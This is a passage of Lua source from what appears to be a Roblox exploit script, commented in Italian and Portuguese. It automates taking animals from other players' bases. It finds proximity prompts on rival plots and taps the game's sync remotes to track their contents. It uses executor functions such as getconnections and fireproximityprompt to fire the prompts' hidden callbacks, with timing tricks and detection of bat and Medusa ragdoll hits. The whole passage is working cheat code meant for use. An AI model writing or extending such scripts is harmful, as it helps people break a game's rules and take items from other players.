          pcall(scanAllPlots)
        end
        task.wait(2)
      end
    end)
  end

  -- Avvio dello scan su richiesta. La Normal ora legge da questa lista,
  -- ma il thread che la riempie partiva SOLO dall'avvio della Semi: senza
  -- aver mai acceso la Semi la lista restava vuota e la Normal non
  -- trovava mai un bersaglio. Da qui la puo' far partire chiunque.
  _G.AmbitiousStealEnsureScan = function()
    ensureScanThread()
    task.spawn(function() pcall(scanAllPlots) end)
  end

end

_G.__AmbitiousSetupSemiAutoSteal()

do
    local getconnections_v3 = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)
    _G.VLESSVSMysteryV1 = _G.VLESSVSMysteryV1 or {
        conn=nil, active=false, progress=0, paused=false, pauseTime=nil,
        startTime=nil, progressConn=nil, dataCache={}, enabled=false,
        StealRadius=63, StealDuration=1.3, TriggerRadius=10
    }
    _G.VLESSVSMysteryNormal = _G.VLESSVSMysteryV1
    local GS = _G.VLESSVSMysteryV1

    local function _v3GetHRP()
        local c = LP.Character
        return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso"))
    end

    local function _v3IsMyPlot(plotName)
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return false end
        local plot = plots:FindFirstChild(plotName)
        if not plot then return false end
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
        end
        return false
    end

    local function _v3FindPrompt()
        local hrp = _v3GetHRP()
        if not hrp then return nil, nil end
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return nil, nil end
        local bestPrompt, bestDist, bestSpawn = nil, math.huge, nil

        for _, plot in ipairs(plots:GetChildren()) do
            if plot:IsA("Model") and not _v3IsMyPlot(plot.Name) then
                local pods = plot:FindFirstChild("AnimalPodiums")
                if pods then
                    for _, pod in ipairs(pods:GetChildren()) do
                        pcall(function()
                            local base  = pod:FindFirstChild("Base")
                            local spawn = base and base:FindFirstChild("Spawn")
                            if not spawn then return end
                            local dist = (spawn.Position - hrp.Position).Magnitude
                            if dist >= bestDist or dist > GS.StealRadius then return end

                            local function tryPrompt(container)
                                for _, ch in ipairs(container:GetChildren()) do
                                    if ch:IsA("ProximityPrompt") and ch.Enabled then
                                        bestPrompt = ch; bestDist = dist; bestSpawn = spawn
                                        return true
                                    end
                                end
                                return false
                            end

                            local att = spawn:FindFirstChild("PromptAttachment")
                            if not (att and tryPrompt(att)) then
                                for _, ch in ipairs(spawn:GetDescendants()) do
                                    if ch:IsA("ProximityPrompt") and ch.Enabled then
                                        bestPrompt = ch; bestDist = dist; bestSpawn = spawn
                                        break
                                    end
                                end
                            end
                        end)
                    end
                end
            end
        end
        return bestPrompt, bestSpawn
    end

    local function _v3DistToSpawn(spawnPart)
        local hrp = _v3GetHRP()
        if not hrp then return math.huge end
        if not spawnPart or not spawnPart.Parent then
            local _, ns = _v3FindPrompt()
            return ns and (hrp.Position - ns.Position).Magnitude or math.huge
        end
        return (hrp.Position - spawnPart.Position).Magnitude
    end

    local function _v3UpdateBar(p, state)
        if _G.StealBar then
            pcall(function()
                _G.StealBar.SetProgress(p or 0)
                if state then _G.StealBar.SetState(state) end
            end)
        end
    end

    local function _v3Active()
        return autoStealEnabled == true and selectedStealMode == "Semi" and selectedSemiMode == "V1"
    end

    local function _v3Execute(prompt, spawnPart)
        if GS.active then return end
        -- janela do Ragdoll Steal: apenas PAUSA o grab, nunca desliga o toggle
        if _G.RagdollStealReady and not _G.RagdollStealReady() then return end

        if not GS.dataCache[prompt] then
            local data = {hold={}, trigger={}, ready=true}
            if getconnections_v3 then
                pcall(function()
                    for _, c in ipairs(getconnections_v3(prompt.PromptButtonHoldBegan)) do
                        if c.Function then table.insert(data.hold, c.Function) end
                    end
                    for _, c in ipairs(getconnections_v3(prompt.Triggered)) do
                        if c.Function then table.insert(data.trigger, c.Function) end
                    end
                end)
            end
            GS.dataCache[prompt] = data
        end

        local data = GS.dataCache[prompt]
        if not data.ready then return end

        data.ready   = false
        GS.active    = true
        GS.paused    = false
        GS.startTime = tick() - (GS.progress * GS.StealDuration)
        local pauseArmed = true

        if GS.progressConn then GS.progressConn:Disconnect() end
        _v3UpdateBar(GS.progress, "STEALING")

        GS.progressConn = RunService.Heartbeat:Connect(function()
            if not GS.active then
                if GS.progressConn then GS.progressConn:Disconnect(); GS.progressConn = nil end
                return
            end

            if not GS.enabled or not _v3Active() or (_G.RagdollStealReady and not _G.RagdollStealReady()) then
                GS.active = false; GS.progress = 0; GS.paused = false
                data.ready = true
                _v3UpdateBar(0, autoStealEnabled and "READY" or "IDLE")
                return
            end

            -- Saiu do Radius do Auto Grab: reseta na hora.
            -- Ao voltar para dentro do Radius o loop principal religa sozinho.
            do
                local rad = tonumber(GS.StealRadius) or 63
                local dNow = _v3DistToSpawn(spawnPart)
                if dNow > rad then
                    GS.active = false
                    GS.progress = 0
                    GS.paused = false
                    GS.pauseTime = nil
                    pauseArmed = true
                    data.ready = true
                    if GS.progressConn then GS.progressConn:Disconnect(); GS.progressConn = nil end
                    _v3UpdateBar(0, autoStealEnabled and "READY" or "IDLE")
                    return
                end
            end

            if GS.paused then
                local dist = _v3DistToSpawn(spawnPart)
                if dist <= GS.TriggerRadius then
                    GS.paused = false
                    GS.pauseTime = nil
                    GS.startTime = tick() - (0.8 * GS.StealDuration)
                else
                    if not GS.pauseTime then
                        GS.pauseTime = tick()
                    elseif tick() - GS.pauseTime >= 1.3 then
                        GS.pauseTime = nil
                        GS.paused = false
                        GS.active = false
                        GS.progress = 0
                        data.ready = true
                        pauseArmed = true
                        if GS.progressConn then GS.progressConn:Disconnect(); GS.progressConn = nil end
                        _v3UpdateBar(0, autoStealEnabled and "READY" or "IDLE")
                        return
                    end
                    GS.progress = 0.8
                    _v3UpdateBar(0.8, "STEALING")
                    return
                end
            end

            local elapsed = tick() - GS.startTime
            local prog = math.clamp(elapsed / GS.StealDuration, 0, 1)
            GS.progress = prog

            if pauseArmed and prog >= 0.8 then
                GS.paused = true
                pauseArmed = false
                GS.progress = 0.8
                _v3UpdateBar(0.8, "STEALING")
                return
            end

            _v3UpdateBar(prog, "STEALING")

            if prog >= 1 then
                GS.active = false; GS.progress = 0; GS.paused = false
                pauseArmed = true
                if GS.progressConn then GS.progressConn:Disconnect(); GS.progressConn = nil end

                local triggered = false
                for _, fn in ipairs(data.trigger) do
                    triggered = true
                    task.spawn(function() pcall(fn) end)
                end
                if not triggered then
                    pcall(function()
                        if fireproximityprompt then
                            fireproximityprompt(prompt, 0)
                        else
                            prompt:InputHoldBegin()
                            task.wait()
                            prompt:InputHoldEnd()
                        end
                    end)
                end

                data.ready = true
                _v3UpdateBar(0, autoStealEnabled and "READY" or "IDLE")
            end
        end)

        for _, fn in ipairs(data.hold) do
            task.spawn(function() pcall(fn) end)
        end
    end

    _G.AmbitiousSemiAutoStealSetRadius = function(v)
        GS.StealRadius = tonumber(v) or GS.StealRadius or 63
    end

    _G.AmbitiousSemiAutoStealStart = function()
        if _G.RagdollStealReady and not _G.RagdollStealReady() then return end
        if GS.conn then GS.conn:Disconnect(); GS.conn = nil end
        GS.enabled       = true
        GS.StealRadius   = tonumber(autoStealRadius) or 63
        GS.StealDuration = 1.3
        GS.TriggerRadius = 10
        GS.conn = RunService.Heartbeat:Connect(function()
            if not GS.enabled or GS.active then return end
            if not _v3Active() then return end
            local prompt, spawnPart = _v3FindPrompt()
            if prompt then _v3Execute(prompt, spawnPart) end
        end)
        _v3UpdateBar(0, "READY")
    end

    _G.AmbitiousSemiAutoStealStop = function()
        GS.enabled = false
        if GS.conn then GS.conn:Disconnect(); GS.conn = nil end
        if GS.progressConn then GS.progressConn:Disconnect(); GS.progressConn = nil end
        GS.active = false; GS.progress = 0; GS.paused = false; GS.pauseTime = nil
        GS.dataCache = {}
        _v3UpdateBar(0, autoStealEnabled and "READY" or "IDLE")
        pcall(function() if _G.StealBar then _G.StealBar.Reset() end end)
    end

    _G.AmbitiousSemiAutoStealSync = function()
        if _v3Active() then
            _G.AmbitiousSemiAutoStealStart()
        else
            _G.AmbitiousSemiAutoStealStop()
        end
    end

end

-- MysteryVs Semi -> Embeer V2
do
    _G.AmbitiousSemiV2Steal = _G.AmbitiousSemiV2Steal or {}
    local AS = _G.AmbitiousSemiV2Steal
    AS.conn         = AS.conn
    AS.scanThread   = AS.scanThread
    AS.enabled      = false
    AS.holdMin      = 1.3
    AS.holdMax      = 2.99
    AS.autoGrabStopPercent = tonumber(State and State.VLESSVSSemiStopPercent) or AS.autoGrabStopPercent or 75
    AS.autoGrabSetDelayRadius = tonumber(rawget(_G, "autoGrabDelayRadius")) or AS.autoGrabSetDelayRadius or 8
    AS.cooldown     = 0.05
    AS.primeRange   = 80
    AS.radius       = (tonumber(autoStealRadius) or 68)
    AS.plotSync     = AS.plotSync or {caches={}, connections={}}
    AS.animals      = AS.animals or {}
    AS.promptCache  = AS.promptCache or {}
    AS.internalCache = AS.internalCache or {}
    AS.state        = AS.state or {active=false, startTime=0, phase="idle", label="", lastResult="", lastResultTime=0}

    local function _semiBarSet(p, label)
        pcall(function()
            if _G.StealBar then
                _G.StealBar.SetState(label or "STEALING")
                _G.StealBar.SetProgress(math.clamp(tonumber(p) or 0, 0, 1))
            end
        end)
    end
    local function _semiBarReset()
        pcall(function() if _G.StealBar then _G.StealBar.Reset() end end)
    end

    local function _semiRoot()
        local c = LP.Character
        return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso")) or nil
    end

    -- path diff helpers
    local function _splitPath(path)
        if typeof(path)=="table" then return path end
        local out = {}
        for p in string.gmatch(tostring(path), "[^%.]+") do
            table.insert(out, tonumber(p) or p)
        end
        return out
    end
    local function _resolvePath(path, root)
        local cur, par, key = root, nil, nil
        for _, p in ipairs(_splitPath(path)) do par=cur; key=p; cur=cur and cur[p] or nil end
        return cur, par, key
    end
    local function _applyDiff(channelName, packet)
        local cache = AS.plotSync.caches[channelName]
        if typeof(cache)~="table" then return end
        local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
        local cur, par, key = _resolvePath(path, cache)
        if action=="Changed" then if par then par[key]=a end
        elseif action=="ArrayInsert" then if cur then table.insert(cur, b, a) end
        elseif action=="ArrayRemoved" then if cur then table.remove(cur, b) end
        elseif action=="DictionaryInsert" then if cur then cur[b]=a end
        elseif action=="DictionaryRemoved" then if cur then cur[b]=nil end
        end
    end

    local function _semiAttachChannel(remote, plots, requestData)
        if AS.plotSync.connections[remote] then return end
        local channelName = tostring(remote.Name)
        if not plots:FindFirstChild(channelName) then return end
        if requestData and AS.plotSync.caches[channelName]==nil then
            local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
            AS.plotSync.caches[channelName] = (ok and typeof(data)=="table") and data or {}
        elseif AS.plotSync.caches[channelName]==nil then
            AS.plotSync.caches[channelName] = {}
        end
        AS.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
            for _, packet in ipairs(queue) do _applyDiff(channelName, packet) end
        end)
    end

    local function _semiEnsureSync()
        if AS.syncReady then return true end
        local ok = pcall(function()
            AS.plots = workspace:WaitForChild("Plots", 10)
            local rs = game:GetService("ReplicatedStorage")
            local pkgs = rs:WaitForChild("Packages", 10)
            local datas = rs:WaitForChild("Datas", 10)
            if not (pkgs and datas and AS.plots) then return end
            AS.animalsData = require(datas:WaitForChild("Animals", 10))
            local sync = pkgs:WaitForChild("Synchronizer", 10)
            AS.channelFolder = sync:WaitForChild("Channel", 10)
            AS.routeRemote   = sync:WaitForChild("CommunicationRoute", 10)
            AS.requestData   = sync:FindFirstChild("RequestData")
            for _, child in ipairs(AS.channelFolder:GetChildren()) do
                if child:IsA("RemoteEvent") then _semiAttachChannel(child, AS.plots, AS.requestData) end
            end
            AS.channelFolder.ChildAdded:Connect(function(child)
                if child:IsA("RemoteEvent") then _semiAttachChannel(child, AS.plots, AS.requestData) end
            end)
            AS.routeRemote.OnClientEvent:Connect(function(actions)
                for _, action in ipairs(actions) do
                    local kind, cn = action[1], tostring(action[2])
                    if AS.plots and AS.plots:FindFirstChild(cn) then
                        if kind=="ListenerAdded" then
                            local r = AS.channelFolder and AS.channelFolder:FindFirstChild(cn)
                            if r and r:IsA("RemoteEvent") then _semiAttachChannel(r, AS.plots, AS.requestData) end
                        elseif kind=="ListenerRemoved" then
                            for remote, conn in pairs(AS.plotSync.connections) do
                                if tostring(remote.Name)==cn then
                                    pcall(function() conn:Disconnect() end)
                                    AS.plotSync.connections[remote] = nil
                                    AS.plotSync.caches[cn] = nil
                                    break
                                end
                            end
                        end
                    end
                end
            end)
            AS.syncReady = true
        end)
        return ok and AS.syncReady==true
    end

    local function _semiPlotOwner(plot)
        local sign  = plot and plot:FindFirstChild("PlotSign")
        local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
        local label = frame and frame:FindFirstChild("TextLabel")
        if not label or label.Text=="Empty Base" then return nil end
        return label.Text:gsub("'s [Bb]ase$",""):gsub("%s+$","")
    end
    local function _semiIsMyBase(animalData)
        if not animalData or not animalData.plot or not AS.plots then return false end
        local plot = AS.plots:FindFirstChild(animalData.plot)
        if not plot then return false end
        local owner = _semiPlotOwner(plot)
        return owner==LP.DisplayName or owner==LP.Name
    end
    local function _semiPodiumFor(animalData)
        local plot = AS.plots and AS.plots:FindFirstChild(animalData.plot)
        local pds  = plot and plot:FindFirstChild("AnimalPodiums")
        return pds and pds:FindFirstChild(animalData.slot) or nil
    end
    local function _semiAnimalPos(animalData)
        local pod = _semiPodiumFor(animalData)
        return pod and pod:GetPivot().Position or nil
    end
    local function _semiDistToAnimal(animalData)
        local root = _semiRoot()
        local pos  = _semiAnimalPos(animalData)
        return root and pos and (root.Position-pos).Magnitude or math.huge
    end
    local function _semiFindPrompt(animalData)
        if not animalData then return nil end
        local cached = AS.promptCache[animalData.uid]
        if cached and cached.Parent then return cached end
        local pod    = _semiPodiumFor(animalData)
        local base   = pod and pod:FindFirstChild("Base")
        local spawn  = base and base:FindFirstChild("Spawn")
        local attach = spawn and spawn:FindFirstChild("PromptAttachment")
        if not attach then return nil end
        for _, p in ipairs(attach:GetChildren()) do
            if p:IsA("ProximityPrompt") then AS.promptCache[animalData.uid]=p; return p end
        end
        return nil
    end
    local function _semiBuildCallbacks(prompt)
        if AS.internalCache[prompt] then return end
        local data = {holdCallbacks={}, triggerCallbacks={}, ready=true}
        local okH, holds = pcall(getconnections, prompt.PromptButtonHoldBegan)
        if okH and type(holds)=="table" then
            for _, c in ipairs(holds) do if type(c.Function)=="function" then table.insert(data.holdCallbacks, c.Function) end end
        end
        local okT, triggers = pcall(getconnections, prompt.Triggered)
        if okT and type(triggers)=="table" then
            for _, c in ipairs(triggers) do if type(c.Function)=="function" then table.insert(data.triggerCallbacks, c.Function) end end
        end
        -- Keep the prompt cached even when the executor cannot expose signal
        -- connections; _semiExecute then uses the proximity-prompt fallback.
        AS.internalCache[prompt]=data
    end
    -- Ambitious Auto Steal V3: preload to a configurable percentage,
    -- wait for Delay Radius, then finish the bar and trigger the prompt.
    AS.generation = AS.generation or 0
    local function _semiAlive(gen)
        return AS.enabled and selectedStealMode == "Semi" and selectedSemiMode == "V2" and AS.generation == gen and autoStealEnabled and (not _G.RagdollStealReady or _G.RagdollStealReady())
    end
    local function _semiExecute(prompt, animalData)
        if not prompt or not prompt.Parent or not animalData then return false end
        if _G.RagdollStealReady and not _G.RagdollStealReady() then return false end
        if AS.state.active then return false end
        if tick()-(AS.state.lastResultTime or 0) < (AS.cooldown or 0.05) then return false end
        _semiBuildCallbacks(prompt)
        local data = AS.internalCache[prompt]
        if not data or not data.ready then return false end
        data.ready=false; AS.state.active=true
        AS.state.startTime=tick(); AS.state.phase="holding"
        AS.state.label = animalData.name or "Animal"

        local generation = AS.generation
        task.spawn(function()
            local startTime = AS.state.startTime
            local duration = 1.3
            local pct = math.clamp(tonumber(AS.autoGrabStopPercent) or 75, 1, 100)
            local stopTime = duration * (pct / 100)
            local cancelled = false

            for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end

            while _semiAlive(generation) do
                local elapsed = tick()-startTime
                if elapsed >= stopTime then break end
                _semiBarSet(math.clamp(elapsed/duration, 0, 1), "STEALING")
                local root = _semiRoot()
                if not root or not prompt.Parent or not prompt.Parent.Parent then cancelled=true; break end
                if (root.Position-prompt.Parent.Parent.Position).Magnitude > (tonumber(AS.radius) or 60) then cancelled=true; break end
                task.wait()
            end

            local stopProgress = math.clamp(stopTime/duration, 0, 1)
            if not cancelled then _semiBarSet(stopProgress, "STEALING") end
            local phase2Timeout = math.max(2.99-stopTime-math.max(duration-stopTime, 0), 0.05)
            local phase2Start = tick()

            while not cancelled and _semiAlive(generation) do
                if tick()-phase2Start >= phase2Timeout then cancelled=true; break end
                if not prompt.Parent or not prompt.Parent.Parent then cancelled=true; break end
                local root = _semiRoot()
                if root then
                    local dist = (root.Position-prompt.Parent.Parent.Position).Magnitude
                    if dist <= (tonumber(AS.autoGrabSetDelayRadius) or 8) then
                        break
                    elseif dist > (tonumber(AS.radius) or 60) then
                        cancelled=true; break
                    end
                end
                task.wait()
            end

            local fired = false
            if not cancelled and _semiAlive(generation) then
                local fillDuration = math.max(duration-stopTime, 0)
                local barLead = math.min(0.05, fillDuration)
                local fillRamp = fillDuration-barLead
                local fillStart = tick()
                while _semiAlive(generation) do
                    local fp = fillRamp > 0 and math.clamp((tick()-fillStart)/fillRamp, 0, 1) or 1
                    _semiBarSet(stopProgress+fp*(1-stopProgress), "STEALING")
                    if fp >= 1 then break end
                    task.wait()
                end
                _semiBarSet(1, "STEALING")
                if barLead > 0 then task.wait(barLead) end
                if not _semiAlive(generation) then
                    if AS.generation == generation then AS.state.active = false; AS.state.phase = "idle"; data.ready = true; _semiBarReset() end
                    return
                end
                for _, fn in ipairs(data.triggerCallbacks) do fired=true; task.spawn(function() pcall(fn) end) end
                if not fired then
                    pcall(function()
                        if fireproximityprompt then
                            fireproximityprompt(prompt, 0)
                        else
                            prompt:InputHoldBegin(); task.wait(); prompt:InputHoldEnd()
                        end
                    end)
                    fired=true
                end
                pcall(function()
                    if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end
                end)
            end

            if AS.generation ~= generation then return end
            AS.state.lastResult = fired and ("Stole "..tostring(AS.state.label)) or (cancelled and "Cancelled" or "Missed")
            AS.state.active=false; AS.state.phase="idle"; AS.state.lastResultTime=tick()
            data.ready=true
            _semiBarReset()
        end)
        return true
    end
    local function _semiScanAllPlots()
        if not _semiEnsureSync() then return 0 end
        local newCache = {}
        for _, plot in ipairs(AS.plots:GetChildren()) do
            local cache = AS.plotSync.caches[plot.Name]
            local animalList = cache and cache.AnimalList
            if typeof(animalList)=="table" then
                for slot, animalData in pairs(animalList) do
                    if type(animalData)=="table" then
                        local animalName = animalData.Index
                        local info = AS.animalsData and AS.animalsData[animalName]
                        if info then
                            table.insert(newCache, {
                                name = info.DisplayName or animalName,
                                plot = plot.Name,
                                slot = tostring(slot),
                                uid  = plot.Name.."_"..tostring(slot),
                                mutation   = animalData.Mutation,
                                traits     = animalData.Traits,
                                generation = animalData.Generation,
                            })
                        end
                    end
                end
            end
        end
        AS.animals = newCache
        return #newCache
    end
    local function _semiPickClosest()
        local root = _semiRoot()
        if not root then return nil end
        local best, bestDist = nil, math.huge
        for _, data in ipairs(AS.animals) do
            if not _semiIsMyBase(data) then
                local pos  = _semiAnimalPos(data)
                local dist = pos and (root.Position-pos).Magnitude or math.huge
                if dist <= (AS.primeRange or 80) and dist < bestDist then
                    best, bestDist = data, dist
                end
            end
        end
        return best
    end
    local function _semiEnsureScanThread()
        if AS.scanThread then return end
        AS.scanThread = task.spawn(function()
            while _G.AmbitiousSemiV2Steal do
                if AS.enabled or (selectedStealMode=="Semi" and selectedSemiMode=="V2") then pcall(_semiScanAllPlots) end
                task.wait(5)
            end
        end)
    end

    _G.AmbitiousSemiV2AutoStealStop = function()
        AS.enabled = false
        AS.generation = AS.generation + 1
        for _, data in pairs(AS.internalCache) do data.ready = true end
        if AS.conn then AS.conn:Disconnect(); AS.conn=nil end
        AS.state.active=false; AS.state.phase="idle"
        _semiBarReset()
    end

    _G.AmbitiousSemiV2AutoStealStart = function()
        if _G.RagdollStealReady and not _G.RagdollStealReady() then return end
        AS.generation = AS.generation + 1
        for _, data in pairs(AS.internalCache) do data.ready = true end
        AS.state.active = false
        AS.autoGrabStopPercent = tonumber(State.VLESSVSSemiStopPercent) or AS.autoGrabStopPercent or 75
        AS.autoGrabSetDelayRadius = tonumber(rawget(_G, "autoGrabDelayRadius")) or AS.autoGrabSetDelayRadius or 8
        AS.radius  = (tonumber(autoStealRadius) or 68)
        AS.enabled = true
        pcall(_semiEnsureSync)
        _semiEnsureScanThread()
        pcall(_semiScanAllPlots)
        if AS.conn then AS.conn:Disconnect(); AS.conn=nil end
        AS.conn = RunService.Heartbeat:Connect(function()
            if not AS.enabled then return end
            if (selectedStealMode~="Semi" or selectedSemiMode~="V2") then _G.AmbitiousSemiV2AutoStealStop(); return end
            if AS.state.active then return end
            local target = _semiPickClosest()
            if not target then return end
            local prompt = _semiFindPrompt(target)
            if prompt then _semiExecute(prompt, target) end
        end)
    end

    _G.AmbitiousSemiV2AutoStealSync = function()
        if (selectedStealMode=="Semi" and selectedSemiMode=="V2") and autoStealEnabled then
            _G.AmbitiousSemiV2AutoStealStart()
        else
            _G.AmbitiousSemiV2AutoStealStop()
        end
    end

end

_G.AmbitiousAutoStealSync = function()
  if not autoStealEnabled then
    if _G.AmbitiousNormalAutoStealStop then _G.AmbitiousNormalAutoStealStop() end
    if _G.AmbitiousSemiAutoStealStop then _G.AmbitiousSemiAutoStealStop() end
    if _G.AmbitiousSemiV2AutoStealStop then _G.AmbitiousSemiV2AutoStealStop() end
    return
  end
  if selectedStealMode == "Normal" then
    if _G.AmbitiousSemiAutoStealStop then _G.AmbitiousSemiAutoStealStop() end
    if _G.AmbitiousSemiV2AutoStealStop then _G.AmbitiousSemiV2AutoStealStop() end
    if _G.AmbitiousNormalAutoStealSync then _G.AmbitiousNormalAutoStealSync() end
  elseif selectedStealMode == "Semi" then
    if _G.AmbitiousNormalAutoStealStop then _G.AmbitiousNormalAutoStealStop() end
    if selectedSemiMode == "V2" then
      if _G.AmbitiousSemiAutoStealStop then _G.AmbitiousSemiAutoStealStop() end
      if _G.AmbitiousSemiV2AutoStealSync then _G.AmbitiousSemiV2AutoStealSync() end
    else
      if _G.AmbitiousSemiV2AutoStealStop then _G.AmbitiousSemiV2AutoStealStop() end
      if _G.AmbitiousSemiAutoStealSync then _G.AmbitiousSemiAutoStealSync() end
    end
  end
end

    -- ============================================================
    -- RAGDOLL STEAL
    -- Morcego (bat): ragdoll 2.7s -> auto grab volta em 1.5s
    -- Medusa's Head: ragdoll 5.7s; nao altera o Auto Grab
    -- ============================================================
    do
    local _rsWindow = nil        -- {t0=number, reenable=number}
    local _rsPrevAutoGrab = nil
    local _rsWasRagdolled = false
    local _rsConn = nil

    local RAG_CFG = {
        bat    = { reenable = 1.5, timer = 2.8 },
        medusa = { reenable = 4.5, timer = 5.7 },
    }
    -- qualquer ragdoll com duracao >= 4s so pode ser Medusa's Head
    local MEDUSA_MIN_DURATION = 4.0
    local _rsGuard = nil
    local _rsHitKind = nil
    local _rsHitAt = 0
    local _rsLastTrigger = 0     -- cooldown: impede detectar 2x o mesmo golpe
    local _rsClearSince = 0      -- ragdoll precisa sumir por um tempo antes de rearmar
    local RS_COOLDOWN = 1.2
    local _rsLockUntil = 0       -- travamento total: 1 golpe = 1 deteccao


    _G._K7RagdollStealClear = function()
        _rsWindow = nil
    end

    local function _rsIsRagdolled(hum)
        local st = hum:GetState()
        if st == Enum.HumanoidStateType.Physics
        or st == Enum.HumanoidStateType.Ragdoll
        or st == Enum.HumanoidStateType.FallingDown then return true end
        local et = LP:GetAttribute("RagdollEndTime")
        if et and (et - workspace:GetServerTimeNow()) > 0 then return true end
        return false
    end

    -- ===== DETECTORES (Medusa's Head x Morcego) =====
    local function _strHasMedusa(n)
        if type(n) ~= "string" then return false end
        n = n:lower()
        return (n:find("medusa") or n:find("petrif") or n:find("stone") or n:find("statue")) and true or false
    end

    local function _strHasBat(n)
        if type(n) ~= "string" then return false end
        n = n:lower()
        return (n:find("bat") or n:find("morcego") or n:find("slap")) and true or false
    end

    -- duracao restante do ragdoll atual (0 se nao houver)
    local function _rsRagdollRemaining()
        local now = workspace:GetServerTimeNow()
        local best = 0
        local et = LP:GetAttribute("RagdollEndTime")
        if type(et) == "number" then
            local rem = et - now
            if rem > best then best = rem end
        end
        for _, obj in ipairs({ LP, LP.Character }) do
            if obj then
                local ok, attrs = pcall(function() return obj:GetAttributes() end)
                if ok and attrs then
                    for k, v in pairs(attrs) do
                        local n = tostring(k):lower()
                        if type(v) == "number" and (n:find("ragdoll") or n:find("stun")
                            or n:find("petrif") or n:find("stone") or n:find("medusa")) then
                            local rem = v - now
                            if rem > 0 and rem < 60 and rem > best then best = rem end
                            if v > 0 and v < 60 and v > best then best = v end
                        end
                    end
                end
            end
        end
        return best
    end

    -- eu estou segurando/portando a Medusa? (para NUNCA disparar quando EU medusar)
    local function _rsIHoldMedusa()
        local c = LP.Character
        if c then
            for _, t in ipairs(c:GetChildren()) do
                if t:IsA("Tool") and _strHasMedusa(t.Name) then return true end
            end
        end
        return false
    end

    -- o objeto esta dentro de uma Tool? (ignora partes da arma que EU seguro)
    local function _rsInsideTool(d)
        local p = d
        while p and p ~= LP.Character do
            if p:IsA("Tool") then return true end
            p = p.Parent
        end
        return false
    end

    -- marcadores exclusivos da Medusa (pedra/petrificacao), sem falso positivo
    local function _rsMedusaMarker()
        local c = LP.Character
        if not c then return false end

        for _, obj in ipairs({ LP, c }) do
            local ok, attrs = pcall(function() return obj:GetAttributes() end)
            if ok and attrs then
                for k, v in pairs(attrs) do
                    if _strHasMedusa(k) then
                        if v == true then return true end
                        if type(v) == "number" and v > workspace:GetServerTimeNow() then return true end
                        if type(v) == "string" and v ~= "" then return true end
                    end
                end
            end
        end

        for _, d in ipairs(c:GetDescendants()) do
            if not d:IsA("Tool") and not _rsInsideTool(d) and _strHasMedusa(d.Name) then return true end
        end
        return false
    end


    -- alguem por perto segurando Medusa's Head?
    local function _rsToolNearby(matcher)
        local myChar = LP.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                local near = (not myRoot) or (not root) or (root.Position - myRoot.Position).Magnitude <= 20
                if near then
                    for _, t in ipairs(plr.Character:GetChildren()) do
                        if t:IsA("Tool") and matcher(t.Name) then return true end
                    end
                end
            end
        end
        return false
    end

    -- ===== EU usei a Medusa? (bloqueia o Ragdoll Steal Med) =====
    local _rsSelfMedusaUntil = 0
    local _rsSelfMedusaConns = {}
    local function _rsWatchSelfMedusa(char)
        for _, c in ipairs(_rsSelfMedusaConns) do pcall(function() c:Disconnect() end) end
        _rsSelfMedusaConns = {}
        _rsSelfMedusaUntil = 0
        if not char then return end
        local function hook(tool)
            if not (tool and tool:IsA("Tool") and _strHasMedusa(tool.Name)) then return end
            table.insert(_rsSelfMedusaConns, tool.Activated:Connect(function()
                _rsSelfMedusaUntil = os.clock() + 8
            end))
        end
        for _, t in ipairs(char:GetChildren()) do hook(t) end
        table.insert(_rsSelfMedusaConns, char.ChildAdded:Connect(hook))
    end
    _G._K7WatchSelfMedusa = _rsWatchSelfMedusa

    local function _rsSelfMedusaActive()
        return os.clock() < _rsSelfMedusaUntil
    end

    -- SO conta quando OUTRO jogador me medusou.
    -- Nunca dispara se fui EU quem usou a Medusa.
    local function _rsIsMedusad()
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if not hum or not _rsIsRagdolled(hum) then return false end
        if _rsSelfMedusaActive() then return false end
        if _rsIHoldMedusa() then return false end
        -- exige um OUTRO jogador por perto empunhando a Medusa's Head
        if not _rsToolNearby(_strHasMedusa) then return false end
        if _rsMedusaMarker() then return true end
        if _rsRagdollRemaining() >= MEDUSA_MIN_DURATION then return true end
        return false
    end

    -- SO detecta quando OUTRA pessoa me bateu (morcego) ou me medusou.
    -- Queda, fisica normal ou uso proprio da Medusa nunca contam.
    local function _rsHitDetected(hum)
        if not _rsIsRagdolled(hum) then return false end
        if _rsSelfMedusaActive() then return false end
        -- precisa existir um oponente por perto com morcego (ou medusa)
        local batNear = _rsToolNearby(_strHasBat)
        local medNear = (not _rsIHoldMedusa()) and _rsToolNearby(_strHasMedusa)
        if not (batNear or medNear) then return false end
        if _rsRagdollRemaining() > 0 then return true end
        local st = hum:GetState()
        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll then
            return true
        end
        return false
    end

    -- classificacao definitiva do golpe recebido
    local function _rsClassifyHit()
        local rem = _rsRagdollRemaining()
        local medNear = (not _rsIHoldMedusa()) and (not _rsSelfMedusaActive()) and _rsToolNearby(_strHasMedusa)
        if medNear and (rem >= MEDUSA_MIN_DURATION or _rsMedusaMarker()) then return "medusa" end
        if medNear and not _rsToolNearby(_strHasBat) then return "medusa" end
        return "bat"
    end



    -- restaura o Auto Grab SEMPRE (nunca pode ficar desligado por bug)
    local function _rsRestoreAutoGrab()
        _rsWindow = nil
        _G._K7AutoGrabPauseUntil = nil
        if autoStealEnabled and _G.AmbitiousAutoStealSync then pcall(_G.AmbitiousAutoStealSync) end
    end
    -- loop unico: roda para sempre; so para de agir se o toggle for desligado
    local function startRagdollSystems(char)
